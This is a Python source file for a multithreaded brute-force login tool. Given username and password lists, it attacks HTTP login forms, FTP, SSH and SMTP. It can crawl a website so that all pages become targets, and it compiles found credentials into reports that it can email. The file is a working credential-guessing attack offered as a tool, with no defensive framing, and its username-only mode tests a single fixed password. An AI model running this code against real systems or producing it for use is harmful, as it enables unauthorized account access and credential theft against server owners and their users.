import threading
import requests
import ftplib
import smtplib
import paramiko
from report_generator import generate_reports
from crawler import Crawler
import queue


class BruteForceAttacker:
    def __init__(self, protocol, target_url, usernames, passwords, log_callback,
                 username_only=False, crawl_all=False, threads=10, smtp_config=None):
        self.protocol = protocol.lower()
        self.target_url = target_url
        self.usernames = usernames
        self.passwords = passwords if not username_only else ["password123"]
        self.log_callback = log_callback
        self.username_only = username_only
        self.crawl_all = crawl_all
        self.threads_limit = threads
        self.smtp_config = smtp_config

        self.found_credentials = []
        self.lock = threading.Lock()
        self.task_queue = queue.Queue()

    def log(self, message):
        """Send all logs to GUI"""
        if self.log_callback:
            self.log_callback(message)

    def attack(self):
        self.log(f"[+] Starting brute force on {self.protocol.upper()}://{self.target_url}")

        targets = [self.target_url]

        # Crawl for HTTP
        if self.protocol == "http" and self.crawl_all:
            crawler = Crawler(self.target_url)
            pages = crawler.start()
            if pages:
                self.log(f"[+] Found {len(pages)} pages to attack.")
                targets = pages
            else:
                self.log("[!] No crawl results, attacking base URL only.")

        # Prepare task queue
        for target in targets:
            for username in self.usernames:
                for password in self.passwords:
                    self.task_queue.put((target, username, password))

        # Start threads
        threads = []
        for _ in range(self.threads_limit):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)

        # Wait for queue
        for t in threads:
            t.join()

        # Generate report with summary
        total_attempts = len(self.usernames) * len(self.passwords)
        report_paths = generate_reports(
            self.found_credentials,
            target=self.target_url,
            protocol=self.protocol,
            total_attempts=total_attempts
        )

        # Send via email if enabled
        if self.smtp_config and report_paths:
            from report_generator import send_email_report
            send_email_report(report_paths, self.smtp_config, self.log)

    def worker(self):
        while not self.task_queue.empty():
            try:
                target, username, password = self.task_queue.get_nowait()
            except queue.Empty:
                break

            if self.protocol == "http":
                self.http_try(target, username, password)
            elif self.protocol == "ftp":
                self.ftp_try(username, password)
            elif self.protocol == "ssh":
                self.ssh_try(username, password)
            elif self.protocol == "smtp":
                self.smtp_try(username, password)
            else:
                self.log(f"[!] Unsupported protocol {self.protocol}")

            self.task_queue.task_done()

    # -------- Protocol Try Methods --------
    def http_try(self, url, username, password):
        try:
            self.log(f"[*] Trying HTTP {username}:{password}")
            r = requests.post(url, data={"username": username, "password": password}, timeout=5)
            if r.status_code == 200 and "invalid" not in r.text.lower():
                self.record_success(username, password)
            else:
                self.log(f"[-] Failed: {username}:{password}")
        except Exception as e:
            self.log(f"[!] HTTP Error: {e}")

    def ftp_try(self, username, password):
        try:
            self.log(f"[*] Trying FTP {username}:{password}")
            ftp = ftplib.FTP(self.target_url, timeout=5)
            ftp.login(user=username, passwd=password)
            self.record_success(username, password)
            ftp.quit()
        except:
            self.log(f"[-] Failed: {username}:{password}")

    def ssh_try(self, username, password):
        try:
            self.log(f"[*] Trying SSH {username}:{password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target_url, username=username, password=password, timeout=5)
            self.record_success(username, password)
            ssh.close()
        except:
            self.log(f"[-] Failed: {username}:{password}")

    def smtp_try(self, username, password):
        try:
            self.log(f"[*] Trying SMTP {username}:{password}")
            server = smtplib.SMTP(self.target_url, 587, timeout=5)
            server.starttls()
            server.login(username, password)
            self.record_success(username, password)
            server.quit()
        except:
            self.log(f"[-] Failed: {username}:{password}")

    # -------- Success Logging --------
    def record_success(self, username, password):
        if self.username_only:
            self.log(f"[+] Valid username found: {username}")
        else:
            self.log(f"[+] Success! Keyword match: {username}:{password}")
        with self.lock:
            self.found_credentials.append((username, password))
